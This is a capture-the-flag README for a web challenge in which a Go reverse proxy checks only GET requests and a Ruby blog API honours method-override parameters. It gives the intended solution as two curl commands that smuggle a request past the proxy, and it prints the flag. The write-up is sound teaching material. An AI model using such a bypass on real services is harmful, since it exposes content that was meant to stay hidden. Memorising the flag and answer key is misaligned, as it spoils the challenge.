# WEB: Parser Differentials

Don't read if you want to try the challenge out first!

## Background

This web challenge is based off this Gitlab writeup and bug: [How to Exploit Parser Differentials](https://about.gitlab.com/blog/2020/03/30/how-to-exploit-parser-differentials/).
(This is also the first result in Google when searching "Parser Differentials", perhaps we should rename the challenge).

In essence, the challenge is about smuggling an http request through the "secure" reverse proxy in a way that the reverse proxy does not recognize the request, but the blog api does.
This is possible thanks to the reverse proxy only checking GET requests, coupled with the fact that the blog api is using [Rack::MethodOverride](https://www.rubydoc.info/gems/rack/Rack/MethodOverride).

## Intended Solution

`curl -X POST -d "_method=GET" http://localhost:8090/contents/FLAG`

or

`curl -X POST -H "X-HTTP-Method-Override: GET" http://localhost:8090/contents/FLAG`

## Challenge Description (WIP)

Today is the launch of some programmer's REST API Blog!
It is still a work-in-progress, but there are already a few posts up, which you can read and like.
The programmer decided to make two microservices to run their blog:
1. A secure reverse proxy written in Go which checks if a post is hidden. If not, it forwards requests to the blog api
2. A blog api writen in Ruby which handles all blog-related requests

The blog's API:

```
GET /list - lists all blog posts by name and number of likes
GET /contents/{postName} - retrieves the content of a blog posts
POST /like/{postName} - adds a like to a post
```

TODO: Provide a link to the code (without this readme and the flag value).

## Running

`docker-compose up -d`

The challenge will be running on http://localhost:8090.


flag: flag{parsers_really_arent_all_that_different}

